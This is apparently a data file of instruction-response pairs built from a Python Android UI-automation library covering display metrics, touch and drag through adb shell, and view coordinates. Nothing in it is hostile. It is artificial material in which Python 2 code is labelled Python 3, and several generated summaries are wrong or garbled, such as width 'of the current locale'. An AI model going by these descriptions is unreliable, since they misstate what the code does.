{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the display dimensions and density values from dumpsys.", "response": "def getLogicalDisplayInfo(self):\n        '''\n        Gets C{mDefaultViewport} and then C{deviceWidth} and C{deviceHeight} values from dumpsys.\n        This is a method to obtain display logical dimensions and density\n        '''\n\n        self.__checkTransport()\n        logicalDisplayRE = re.compile(\n            '.*DisplayViewport\\{valid=true, .*orientation=(?P<orientation>\\d+), .*deviceWidth=(?P<width>\\d+), deviceHeight=(?P<height>\\d+).*')\n        for line in self.shell('dumpsys display').splitlines():\n            m = logicalDisplayRE.search(line, 0)\n            if m:\n                self.__displayInfo = {}\n                for prop in ['width', 'height', 'orientation']:\n                    self.__displayInfo[prop] = int(m.group(prop))\n                for prop in ['density']:\n                    d = self.__getDisplayDensity(None, strip=True, invokeGetPhysicalDisplayIfNotFound=True)\n                    if d:\n                        self.__displayInfo[prop] = d\n                    else:\n                        # No available density information\n                        self.__displayInfo[prop] = -1.0\n                return self.__displayInfo\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getPhysicalDisplayInfo(self):\n        ''' Gets C{mPhysicalDisplayInfo} values from dumpsys. This is a method to obtain display dimensions and density'''\n\n        self.__checkTransport()\n        phyDispRE = re.compile('Physical size: (?P<width>\\d+)x(?P<height>\\d+).*Physical density: (?P<density>\\d+)',\n                               re.DOTALL)\n        m = phyDispRE.search(self.shell('wm size; wm density'))\n        if m:\n            displayInfo = {}\n            for prop in ['width', 'height']:\n                displayInfo[prop] = int(m.group(prop))\n            for prop in ['density']:\n                displayInfo[prop] = float(m.group(prop))\n            return displayInfo\n\n        phyDispRE = re.compile(\n            '.*PhysicalDisplayInfo{(?P<width>\\d+) x (?P<height>\\d+), .*, density (?P<density>[\\d.]+).*')\n        for line in self.shell('dumpsys display').splitlines():\n            m = phyDispRE.search(line, 0)\n            if m:\n                displayInfo = {}\n                for prop in ['width', 'height']:\n                    displayInfo[prop] = int(m.group(prop))\n                for prop in ['density']:\n                    # In mPhysicalDisplayInfo density is already a factor, no need to calculate\n                    displayInfo[prop] = float(m.group(prop))\n                return displayInfo\n\n        # This could also be mSystem or mOverscanScreen\n        phyDispRE = re.compile('\\s*mUnrestrictedScreen=\\((?P<x>\\d+),(?P<y>\\d+)\\) (?P<width>\\d+)x(?P<height>\\d+)')\n        # This is known to work on older versions (i.e. API 10) where mrestrictedScreen is not available\n        dispWHRE = re.compile('\\s*DisplayWidth=(?P<width>\\d+) *DisplayHeight=(?P<height>\\d+)')\n        for line in self.shell('dumpsys window').splitlines():\n            m = phyDispRE.search(line, 0)\n            if not m:\n                m = dispWHRE.search(line, 0)\n            if m:\n                displayInfo = {}\n                for prop in ['width', 'height']:\n                    displayInfo[prop] = int(m.group(prop))\n                for prop in ['density']:\n                    d = self.__getDisplayDensity(None, strip=True, invokeGetPhysicalDisplayIfNotFound=False)\n                    if d:\n                        displayInfo[prop] = d\n                    else:\n                        # No available density information\n                        displayInfo[prop] = -1.0\n                return displayInfo", "response": "Gets C { mPhysicalDisplayInfo values from dumpsys. This method returns C { mPhysicalDisplayInfo } values from dumpsys."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the property value for the specified key.", "response": "def getProperty(self, key, strip=True):\n        ''' Gets the property value for key '''\n\n        self.__checkTransport()\n        import collections\n        MAP_PROPS = collections.OrderedDict([\n            (re.compile('display.width'), self.__getDisplayWidth),\n            (re.compile('display.height'), self.__getDisplayHeight),\n            (re.compile('display.density'), self.__getDisplayDensity),\n            (re.compile('display.orientation'), self.__getDisplayOrientation),\n            (re.compile('.*'), self.__getProp),\n        ])\n        '''Maps properties key values (as regexps) to instance methods to obtain its values.'''\n\n        for kre in MAP_PROPS.keys():\n            if kre.match(key):\n                return MAP_PROPS[kre](key=key, strip=strip)\n        raise ValueError(\"key='%s' does not match any map entry\")"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef longTouch(self, x, y, duration=2000, orientation=-1):\n        '''\n        Long touches at (x, y)\n\n        @param duration: duration in ms\n        @param orientation: the orientation (-1: undefined)\n\n        This workaround was suggested by U{HaMi<http://stackoverflow.com/users/2571957/hami>}\n        '''\n\n        self.__checkTransport()\n        self.drag((x, y), (x, y), duration, orientation)", "response": "Long touches at x y"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef drag(self, (x0, y0), (x1, y1), duration, steps=1, orientation=-1):\n\n        self.__checkTransport()\n        if orientation == -1:\n            orientation = self.display['orientation']\n        (x0, y0) = self.__transformPointByOrientation((x0, y0), orientation, self.display['orientation'])\n        (x1, y1) = self.__transformPointByOrientation((x1, y1), orientation, self.display['orientation'])\n\n        version = self.getSdkVersion()\n        if version <= 15:\n            raise RuntimeError('drag: API <= 15 not supported (version=%d)' % version)\n        elif version <= 17:\n            self.shell('input swipe %d %d %d %d' % (x0, y0, x1, y1))\n        else:\n            self.shell('input touchscreen swipe %d %d %d %d %d' % (x0, y0, x1, y1, duration))", "response": "Sends a drag event in PX."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsending drag event in DIP.", "response": "def dragDip(self, (x0, y0), (x1, y1), duration, steps=1, orientation=-1):\n        \"\"\"\n        Sends drag event in DIP (actually it's using C{input swipe} command.\n\n        @param (x0, y0): starting point in DIP\n        @param (x1, y1): ending point in DIP\n        @param duration: duration of the event in ms\n        @param steps: number of steps (currently ignored by C{input swipe})\n        \"\"\"\n\n        self.__checkTransport()\n        if orientation == -1:\n            orientation = self.display['orientation']\n        density = self.display['density'] if self.display['density'] > 0 else 1\n        x0 = x0 * density\n        y0 = y0 * density\n        x1 = x1 * density\n        y1 = y1 * density\n        self.drag((x0, y0), (x1, y1), duration, steps, orientation)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef isLocked(self):\n        '''\n        Checks if the device screen is locked.\n\n        @return True if the device screen is locked\n        '''\n\n        self.__checkTransport()\n        lockScreenRE = re.compile('mShowingLockscreen=(true|false)')\n        dwp = self.shell('dumpsys window policy')\n        m = lockScreenRE.search(dwp)\n        if m:\n            return m.group(1) == 'true'\n        dreamingLockscreenRE = re.compile('mDreamingLockscreen=(true|false)')\n        m = dreamingLockscreenRE.search(dwp)\n        if m:\n            return m.group(1) == 'true'\n        raise RuntimeError(\"Couldn't determine screen lock state\")", "response": "Checks if the device screen is locked."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks if the device screen is ON.", "response": "def isScreenOn(self):\n        \"\"\"\n        Checks if the screen is ON.\n\n        @return: True if the device screen is ON\n        \"\"\"\n\n        self.__checkTransport()\n        screenOnRE = re.compile('mScreenOnFully=(true|false)')\n        m = screenOnRE.search(self.shell('dumpsys window policy'))\n        if m:\n            return m.group(1) == 'true'\n        raise RuntimeError(\"Couldn't determine screen ON state\")"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the percent of pixels that are equal in the image1 image2.", "response": "def percentSame(image1, image2):\n        '''\n        Returns the percent of pixels that are equal\n\n        @author: catshoes\n        '''\n\n        # If the images differ in size, return 0% same.\n        size_x1, size_y1 = image1.size\n        size_x2, size_y2 = image2.size\n        if (size_x1 != size_x2 or\n                    size_y1 != size_y2):\n            return 0\n\n        # Images are the same size\n        # Return the percent of pixels that are equal.\n        numPixelsSame = 0\n        numPixelsTotal = size_x1 * size_y1\n        image1Pixels = image1.load()\n        image2Pixels = image2.load()\n\n        # Loop over all pixels, comparing pixel in image1 to image2\n        for x in range(size_x1):\n            for y in range(size_y1):\n                if image1Pixels[x, y] == image2Pixels[x, y]:\n                    numPixelsSame += 1\n\n        return numPixelsSame / float(numPixelsTotal)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef imageInScreen(screen, image):\n\n        # To make sure image smaller than screen.\n        size_x1, size_y1 = screen.size\n        size_x2, size_y2 = image.size\n        if size_x1 <= size_x2 or size_y1 <= size_y2:\n            return 0\n\n        # Load pixels.\n        screenPixels = screen.load()\n        imagePixels = image.load()\n\n        # Loop over all pixels, if pixel image[0,0] same as pixel screen[x,y] do crop and compare\n        for x in range(size_x1 - size_x2):\n            for y in range(size_y1 - size_y2):\n                if imagePixels[0, 0] == screenPixels[x, y]:\n                    croppedScreen = screen.crop((x, y, x + size_x2, y + size_y2))\n                    size_x3, size_y3 = croppedScreen.size\n                    croppedPixels = croppedScreen.load()\n                    for x in range(size_x3):\n                        for y in range(size_y3):\n                            if imagePixels[x, y] == croppedPixels[x, y]:\n                                return True", "response": "Checks if image is on the screen."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning True if the keyboard is displayed.", "response": "def isKeyboardShown(self):\n        '''\n        Whether the keyboard is displayed.\n        '''\n\n        self.__checkTransport()\n        dim = self.shell('dumpsys input_method')\n        if dim:\n            # FIXME: API >= 15 ?\n            return \"mInputShown=true\" in dim\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfixes a problem with Tkinter Buttons in Mojave.", "response": "def fix(self):\n        \"\"\"\n        Fix a problem with Tkinter Buttons in Mojave.\n        See https://stackoverflow.com/questions/52529403/button-text-of-tkinter-not-works-in-mojave\n        \"\"\"\n        a = self.childWindow.winfo_geometry().split('+')[0]\n        b = a.split('x')\n        w = int(b[0])\n        h = int(b[1])\n        self.childWindow.geometry('%dx%d' % (w + 1, h + 1))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a new keycode tab.", "response": "def createKeycodeTab(self):\n        ''' KEYCODE '''\n        _keycodeList = [\n            'KEYCODE_HOME', 'KEYCODE_DPAD_UP', 'KEYCODE_BACK', 'KEYCODE_SEARCH', 'KEYCODE_CHANNEL_UP', 'KEYCODE_TV',\n            'KEYCODE_MUSIC', 'KEYCODE_EXPLORER', 'KEYCODE_CAMERA', 'KEYCODE_POWER', 'KEYCODE_DPAD_LEFT',\n            'KEYCODE_DPAD_DOWN',\n            'KEYCODE_DPAD_RIGHT', 'KEYCODE_PAGE_UP', 'KEYCODE_CHANNEL_DOWN', 'KEYCODE_VOLUME_UP', 'KEYCODE_MEDIA_PLAY',\n            'KEYCODE_CONTACTS', 'KEYCODE_ZOOM_IN', 'SNAPSHOPT', 'KEYCODE_MENU', 'KEYCODE_DPAD_CENTER', 'KEYCODE_ENTER',\n            'KEYCODE_PAGE_DOWN', 'KEYCODE_BRIGHTNESS_DOWN', 'KEYCODE_VOLUME_DOWN', 'KEYCODE_MEDIA_PAUSE',\n            'KEYCODE_BOOKMARK',\n            'KEYCODE_ZOOM_OUT', 'REFRESH', 'KEYCODE_APP_SWITCH', 'KEYCODE_GOOGLE_NOW', 'KEYCODE_CALL', 'KEYCODE_ESCAPE',\n            'KEYCODE_BRIGHTNESS_UP', 'KEYCODE_VOLUME_MUTE', 'KEYCODE_MEDIA_STOP', 'KEYCODE_CALCULATOR',\n            'KEYCODE_SETTINGS', 'QUIT'\n        ]\n        for keycode in _keycodeList:\n            _cpb = ControlPanelButton(self.keycodeTab, self.culebron, self.printOperation, value=keycode,\n                                      text=keycode[8:],\n                                      width=Layout.BUTTON_WIDTH,\n                                      bg=self.bg, fg=self.fg,\n                                      highlightbackground=self.highlightbackground)\n\n            if keycode == 'REFRESH':\n                _cpb.configure(fg=Color.BLUE, bg=Color.DARK_GRAY, text=keycode, command=_cpb.refreshScreen)\n            elif keycode == 'SNAPSHOPT':\n                _cpb.configure(fg=Color.BLUE, bg=Color.DARK_GRAY, text=keycode, command=_cpb.takeSnapshot)\n            elif keycode == 'QUIT':\n                _cpb.configure(fg=Color.BLUE, bg=Color.DARK_GRAY, text=keycode, command=self.childWindow.destroy)\n            else:\n                _cpb.configure(command=_cpb.command)\n            _cpb.grid(column=self.childWindow.column, row=self.childWindow.row)\n            self.tabLayout()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef obtainAdbPath():\n    '''\n    Obtains the ADB path attempting know locations for different OSs\n    '''\n\n    FORCE_FAIL = False\n    ''' Sometimes, you want it to fail to check the error messages '''\n    osName = platform.system()\n    isWindows = False\n    adb = 'adb'\n\n    if (osName.startswith('Windows')) or (osName.startswith('Java')):\n        envOSName = os.getenv('os')  # this should work as it has been set since xp.\n        if envOSName.startswith('Windows'):\n            adb = 'adb.exe'\n            isWindows = True\n\n    exeFile = which(adb, isWindows)\n    if exeFile:\n        return exeFile\n\n    ANDROID_HOME = os.environ['ANDROID_HOME'] if os.environ.has_key('ANDROID_HOME') else '/opt/android-sdk'\n    HOME = os.environ['HOME'] if os.environ.has_key('HOME') else ''\n\n    possibleChoices = [os.path.join(ANDROID_HOME, 'platform-tools', adb),\n                       os.path.join(HOME, \"android\", 'platform-tools', adb),\n                       os.path.join(HOME, \"android-sdk\", 'platform-tools', adb),\n                       ]\n\n    if osName.startswith('Windows'):\n        possibleChoices.append(os.path.join(\"\"\"C:\\Program Files\\Android\\android-sdk\\platform-tools\"\"\", adb))\n        possibleChoices.append(os.path.join(\"\"\"C:\\Program Files (x86)\\Android\\android-sdk\\platform-tools\"\"\", adb))\n    elif osName.startswith('Linux'):\n        possibleChoices.append(os.path.join(os.sep, \"opt\", \"android-sdk-linux\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, \"opt\", \"android-sdk-linux\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, \"android-sdk-linux\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, 'Android', 'Sdk', 'platform-tools', adb))\n    elif osName.startswith('Mac'):\n        possibleChoices.append(os.path.join(HOME, \"Library\", \"Android\", \"sdk\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(os.sep, \"opt\", \"android-sdk-mac_x86\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, \"opt\", \"android-sdk-mac\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, \"android-sdk-mac\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, \"opt\", \"android-sdk-mac_x86\", 'platform-tools', adb))\n        possibleChoices.append(os.path.join(HOME, \"android-sdk-mac_x86\", 'platform-tools', adb))\n    else:\n        # Unsupported OS\n        pass\n\n    possibleChoices.append(adb)\n\n    checkedFiles = []\n\n    for exeFile in possibleChoices:\n        checkedFiles.append(exeFile)\n        if not FORCE_FAIL and os.access(exeFile, os.X_OK):\n            return exeFile\n\n    for path in os.environ[\"PATH\"].split(os.pathsep):\n        exeFile = os.path.join(path, adb)\n        checkedFiles.append(exeFile)\n        if not FORCE_FAIL and exeFile is not None and os.access(exeFile, os.X_OK if not isWindows else os.F_OK):\n            return exeFile\n\n    if not os.environ.has_key('ANDROID_HOME'):\n        helpMsg = 'Did you forget to set ANDROID_HOME in the environment?'\n    else:\n        helpMsg = ''\n\n    raise Exception('''adb=\"%s\" is not executable. %s\n\nThese files we unsuccessfully checked to find a suitable '%s' executable:\n    %s\n    ''' % (adb, helpMsg, adb, \"\\n    \".join(checkedFiles)))", "response": "Obtain the path to the ADB file for the current OS."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef debugArgsToDict(a):\n    s = a.replace('+', ' ')\n    s = s.replace('=', ':')\n    s = re.sub(r'([A-Z][A-Z_]+)', r\"'\\1'\", s)\n    return ast.literal_eval('{ ' + s + ' }')", "response": "Converts a string representation of debug arguments to a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nviews factory @type arg1: ClassType or dict @type arg2: View instance or AdbClient", "response": "def factory(arg1, arg2, version=-1, forceviewserveruse=False, windowId=None, uiAutomatorHelper=None):\n        '''\n        View factory\n\n        @type arg1: ClassType or dict\n        @type arg2: View instance or AdbClient\n        '''\n\n        if DEBUG_VIEW_FACTORY:\n            print >> sys.stderr, \"View.factory(%s, %s, %s, %s, %s, %s)\" % (arg1, arg2, version, forceviewserveruse, windowId, uiAutomatorHelper)\n        if type(arg1) == types.ClassType:\n            cls = arg1\n            attrs = None\n        else:\n            cls = None\n            attrs = arg1\n        if isinstance(arg2, View):\n            view = arg2\n            device = None\n        else:\n            device = arg2\n            view = None\n\n        if attrs and attrs.has_key('class'):\n            clazz = attrs['class']\n            if DEBUG_VIEW_FACTORY:\n                print >> sys.stderr, \"    View.factory: creating View with specific class: %s\" % clazz\n            if clazz == 'android.widget.TextView':\n                return TextView(attrs, device, version, forceviewserveruse, windowId, uiAutomatorHelper)\n            elif clazz == 'android.widget.EditText':\n                return EditText(attrs, device, version, forceviewserveruse, windowId, uiAutomatorHelper)\n            elif clazz == 'android.widget.ListView':\n                return ListView(attrs, device, version, forceviewserveruse, windowId, uiAutomatorHelper)\n            else:\n                return View(attrs, device, version, forceviewserveruse, windowId, uiAutomatorHelper)\n        elif cls:\n            if view:\n                return cls.__copy(view)\n            else:\n                return cls(attrs, device, version, forceviewserveruse, windowId, uiAutomatorHelper)\n        elif view:\n            return copy.copy(view)\n        else:\n            if DEBUG_VIEW_FACTORY:\n                print >> sys.stderr, \"    View.factory: creating generic View\"\n            return View(attrs, device, version, forceviewserveruse, windowId, uiAutomatorHelper)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncopying constructor for a", "response": "def __copy(cls, view):\n        '''\n        Copy constructor\n        '''\n\n        return cls(view.map, view.device, view.version, view.forceviewserveruse, view.windowId, view.uiAutomatorHelper)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef getHeight(self):\n        '''\n        Gets the height.\n        '''\n\n        if self.useUiAutomator:\n            return self.map['bounds'][1][1] - self.map['bounds'][0][1]\n        else:\n            try:\n                return int(self.map[self.heightProperty])\n            except:\n                return 0", "response": "Gets the height of the object."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef getWidth(self):\n        '''\n        Gets the width.\n        '''\n\n        if self.useUiAutomator:\n            return self.map['bounds'][1][0] - self.map['bounds'][0][0]\n        else:\n            try:\n                return int(self.map[self.widthProperty])\n            except:\n                return 0", "response": "Gets the width of the current locale."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets the View visibility of the current locale", "response": "def getVisibility(self):\n        '''\n        Gets the View visibility\n        '''\n\n        try:\n            if self.map[GET_VISIBILITY_PROPERTY] == 'VISIBLE':\n                return VISIBLE\n            elif self.map[GET_VISIBILITY_PROPERTY] == 'INVISIBLE':\n                return INVISIBLE\n            elif self.map[GET_VISIBILITY_PROPERTY] == 'GONE':\n                return GONE\n            else:\n                return -2\n        except:\n            return -1"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the View X coordinate", "response": "def __getX(self):\n        '''\n        Gets the View X coordinate\n        '''\n\n        if DEBUG_COORDS:\n            print >>sys.stderr, \"getX(%s %s ## %s)\" % (self.getClass(), self.getId(), self.getUniqueId())\n        x = 0\n\n        if self.useUiAutomator:\n            x = self.map['bounds'][0][0]\n        else:\n            try:\n                if GET_VISIBILITY_PROPERTY in self.map and self.map[GET_VISIBILITY_PROPERTY] == 'VISIBLE':\n                    _x = int(self.map[self.leftProperty])\n                    if DEBUG_COORDS: print >>sys.stderr, \"   getX: VISIBLE adding %d\" % _x\n                    x += _x\n            except:\n                warnings.warn(\"View %s has no '%s' property\" % (self.getId(), self.leftProperty))\n\n        if DEBUG_COORDS: print >>sys.stderr, \"   getX: returning %d\" % (x)\n        return x"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the View Y coordinate", "response": "def __getY(self):\n        '''\n        Gets the View Y coordinate\n        '''\n\n        if DEBUG_COORDS:\n            print >>sys.stderr, \"getY(%s %s ## %s)\" % (self.getClass(), self.getId(), self.getUniqueId())\n        y = 0\n\n        if self.useUiAutomator:\n            y = self.map['bounds'][0][1]\n        else:\n            try:\n                if GET_VISIBILITY_PROPERTY in self.map and self.map[GET_VISIBILITY_PROPERTY] == 'VISIBLE':\n                    _y = int(self.map[self.topProperty])\n                    if DEBUG_COORDS: print >>sys.stderr, \"   getY: VISIBLE adding %d\" % _y\n                    y += _y\n            except:\n                warnings.warn(\"View %s has no '%s' property\" % (self.getId(), self.topProperty))\n\n        if DEBUG_COORDS: print >>sys.stderr, \"   getY: returning %d\" % (y)\n        return y"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef getXY(self, debug=False):\n        '''\n        Returns the I{screen} coordinates of this C{View}.\n\n        WARNING: Don't call self.getX() or self.getY() inside this method\n        or it will enter an infinite loop\n\n        @return: The I{screen} coordinates of this C{View}\n        '''\n\n        if DEBUG_COORDS or debug:\n            try:\n                _id = self.getId()\n            except:\n                _id = \"NO_ID\"\n            print >> sys.stderr, \"getXY(%s %s ## %s)\" % (self.getClass(), _id, self.getUniqueId())\n\n        x = self.__getX()\n        y = self.__getY()\n        if self.useUiAutomator:\n            return (x, y)\n\n        parent = self.parent\n        if DEBUG_COORDS: print >> sys.stderr, \"   getXY: x=%s y=%s parent=%s\" % (x, y, parent.getUniqueId() if parent else \"None\")\n        hx = 0\n        ''' Hierarchy accumulated X '''\n        hy = 0\n        ''' Hierarchy accumulated Y '''\n\n        if DEBUG_COORDS: print >> sys.stderr, \"   getXY: not using UiAutomator, calculating parent coordinates\"\n        while parent != None:\n            if DEBUG_COORDS: print >> sys.stderr, \"      getXY: parent: %s %s <<<<\" % (parent.getClass(), parent.getId())\n            if SKIP_CERTAIN_CLASSES_IN_GET_XY_ENABLED:\n                if parent.getClass() in [ 'com.android.internal.widget.ActionBarView',\n                                   'com.android.internal.widget.ActionBarContextView',\n                                   'com.android.internal.view.menu.ActionMenuView',\n                                   'com.android.internal.policy.impl.PhoneWindow$DecorView' ]:\n                    if DEBUG_COORDS: print >> sys.stderr, \"   getXY: skipping %s %s (%d,%d)\" % (parent.getClass(), parent.getId(), parent.__getX(), parent.__getY())\n                    parent = parent.parent\n                    continue\n            if DEBUG_COORDS: print >> sys.stderr, \"   getXY: parent=%s x=%d hx=%d y=%d hy=%d\" % (parent.getId(), x, hx, y, hy)\n            hx += parent.__getX()\n            hy += parent.__getY()\n            parent = parent.parent\n\n        (wvx, wvy) = self.__dumpWindowsInformation(debug=debug)\n        if DEBUG_COORDS or debug:\n            print >>sys.stderr, \"   getXY: wv=(%d, %d) (windows information)\" % (wvx, wvy)\n        try:\n            if self.windowId:\n                fw = self.windows[self.windowId]\n            else:\n                fw = self.windows[self.currentFocus]\n            if DEBUG_STATUSBAR:\n                print >> sys.stderr, \"    getXY: focused window=\", fw\n                print >> sys.stderr, \"    getXY: deciding whether to consider statusbar offset because current focused windows is at\", (fw.wvx, fw.wvy), \"parent\", (fw.px, fw.py)\n        except KeyError:\n            fw = None\n        (sbw, sbh) = self.__obtainStatusBarDimensionsIfVisible()\n        if DEBUG_COORDS or debug:\n            print >>sys.stderr, \"   getXY: sb=(%d, %d) (statusbar dimensions)\" % (sbw, sbh)\n        statusBarOffset = 0\n        pwx = 0\n        pwy = 0\n\n        if fw:\n            if DEBUG_COORDS:\n                print >>sys.stderr, \"    getXY: focused window=\", fw, \"sb=\", (sbw, sbh)\n            if fw.wvy <= sbh: # it's very unlikely that fw.wvy < sbh, that is a window over the statusbar\n                if DEBUG_STATUSBAR: print >>sys.stderr, \"        getXY: yes, considering offset=\", sbh\n                statusBarOffset = sbh\n            else:\n                if DEBUG_STATUSBAR: print >>sys.stderr, \"        getXY: no, ignoring statusbar offset fw.wvy=\", fw.wvy, \">\", sbh\n\n            if fw.py == fw.wvy:\n                if DEBUG_STATUSBAR: print >>sys.stderr, \"        getXY: but wait, fw.py == fw.wvy so we are adjusting by \", (fw.px, fw.py)\n                pwx = fw.px\n                pwy = fw.py\n            else:\n                if DEBUG_STATUSBAR: print >>sys.stderr, \"    getXY: fw.py=%d <= fw.wvy=%d, no adjustment\" % (fw.py, fw.wvy)\n\n        if DEBUG_COORDS or DEBUG_STATUSBAR or debug:\n            print >>sys.stderr, \"   getXY: returning (%d, %d) ***\" % (x+hx+wvx+pwx, y+hy+wvy-statusBarOffset+pwy)\n            print >>sys.stderr, \"                     x=%d+%d+%d+%d\" % (x,hx,wvx,pwx)\n            print >>sys.stderr, \"                     y=%d+%d+%d-%d+%d\" % (y,hy,wvy,statusBarOffset,pwy)\n        return (x+hx+wvx+pwx, y+hy+wvy-statusBarOffset+pwy)", "response": "Returns the X Y coordinates of this view."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the coords of the View", "response": "def getCoords(self):\n        '''\n        Gets the coords of the View\n\n        @return: A tuple containing the View's coordinates ((L, T), (R, B))\n        '''\n\n        if DEBUG_COORDS:\n            print >>sys.stderr, \"getCoords(%s %s ## %s)\" % (self.getClass(), self.getId(), self.getUniqueId())\n\n        (x, y) = self.getXY();\n        w = self.getWidth()\n        h = self.getHeight()\n        return ((x, y), (x+w, y+h))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getPositionAndSize(self):\n        '''\n        Gets the position and size (X,Y, W, H)\n\n        @return: A tuple containing the View's coordinates (X, Y, W, H)\n        '''\n\n        (x, y) = self.getXY();\n        w = self.getWidth()\n        h = self.getHeight()\n        return (x, y, w, h)", "response": "Gets the position and size of the view"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget the center coords of the View", "response": "def getCenter(self):\n        '''\n        Gets the center coords of the View\n\n        @author: U{Dean Morin <https://github.com/deanmorin>}\n        '''\n\n        (left, top), (right, bottom) = self.getCoords()\n        x = left + (right - left) / 2\n        y = top + (bottom - top) / 2\n        return (x, y)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef touch(self, eventType=adbclient.DOWN_AND_UP, deltaX=0, deltaY=0):\n        '''\n        Touches the center of this C{View}. The touch can be displaced from the center by\n        using C{deltaX} and C{deltaY} values.\n\n        @param eventType: The event type\n        @type eventType: L{adbclient.DOWN}, L{adbclient.UP} or L{adbclient.DOWN_AND_UP}\n        @param deltaX: Displacement from center (X axis)\n        @type deltaX: int\n        @param deltaY: Displacement from center (Y axis)\n        @type deltaY: int\n        '''\n\n        (x, y) = self.getCenter()\n        if deltaX:\n            x += deltaX\n        if deltaY:\n            y += deltaY\n        if DEBUG_TOUCH:\n            print >>sys.stderr, \"should touch @ (%d, %d)\" % (x, y)\n        if VIEW_CLIENT_TOUCH_WORKAROUND_ENABLED and eventType == adbclient.DOWN_AND_UP:\n            if WARNINGS:\n                print >> sys.stderr, \"ViewClient: touch workaround enabled\"\n            self.device.touch(x, y, eventType=adbclient.DOWN)\n            time.sleep(50/1000.0)\n            self.device.touch(x+10, y+10, eventType=adbclient.UP)\n        else:\n            if self.uiAutomatorHelper:\n                selector = self.obtainSelectorForView()\n                if selector:\n                    try:\n                        oid = self.uiAutomatorHelper.findObject(bySelector=selector)\n                        if DEBUG_UI_AUTOMATOR_HELPER:\n                            print >> sys.stderr, \"oid=\", oid\n                            print >> sys.stderr, \"ignoring click delta to click View as UiObject\"\n                        oid.click();\n                    except RuntimeError as e:\n                        print >> sys.stderr, e.message\n                        print >> sys.stderr, \"UiObject click failed, using co-ordinates\"\n                        self.uiAutomatorHelper.click(x=x, y=y)\n                else:\n                    # FIXME:\n                    # The View has no CD, TEXT or ID so we cannot use it in a selector to findObject()\n                    # We should try content description, text, and perhaps other properties before surrendering.\n                    # For now, tet's fall back to click(x, y)\n                    self.uiAutomatorHelper.click(x=x, y=y)\n            else:\n                self.device.touch(x, y, eventType=eventType)", "response": "Touches the center of this View."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef longTouch(self, duration=2000):\n        '''\n        Long touches this C{View}\n\n        @param duration: duration in ms\n        '''\n\n        (x, y) = self.getCenter()\n        if self.uiAutomatorHelper:\n            self.uiAutomatorHelper.swipe(startX=x, startY=y, endX=x, endY=y, steps=200)\n        else:\n            # FIXME: get orientation\n            self.device.longTouch(x, y, duration, orientation=-1)", "response": "Long touches this C{View"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the focused value of the attribute", "response": "def isFocused(self):\n        '''\n        Gets the focused value\n\n        @return: the focused value. If the property cannot be found returns C{False}\n        '''\n\n        try:\n            return True if self.map[self.isFocusedProperty].lower() == 'true' else False\n        except Exception:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef writeImageToFile(self, filename, _format=\"PNG\"):\n        '''\n        Write the View image to the specified filename in the specified format.\n\n        @type filename: str\n        @param filename: Absolute path and optional filename receiving the image. If this points to\n                         a directory, then the filename is determined by this View unique ID and\n                         format extension.\n        @type _format: str\n        @param _format: Image format (default format is PNG)\n        '''\n\n        filename = self.device.substituteDeviceTemplate(filename)\n        if not os.path.isabs(filename):\n            raise ValueError(\"writeImageToFile expects an absolute path (fielname='%s')\" % filename)\n        if os.path.isdir(filename):\n            filename = os.path.join(filename, self.variableNameFromId() + '.' + _format.lower())\n        if DEBUG:\n            print >> sys.stderr, \"writeImageToFile: saving image to '%s' in %s format\" % (filename, _format)\n        #self.device.takeSnapshot().getSubImage(self.getPositionAndSize()).writeToFile(filename, _format)\n        # crop:\n        # im.crop(box) \u21d2 image\n        # Returns a copy of a rectangular region from the current image.\n        # The box is a 4-tuple defining the left, upper, right, and lower pixel coordinate.\n        ((l, t), (r, b)) = self.getCoords()\n        box = (l, t, r, b)\n        if DEBUG:\n            print >> sys.stderr, \"writeImageToFile: cropping\", box, \"    reconnect=\", self.device.reconnect\n        if self.uiAutomatorHelper:\n            if DEBUG_UI_AUTOMATOR_HELPER:\n                print >> 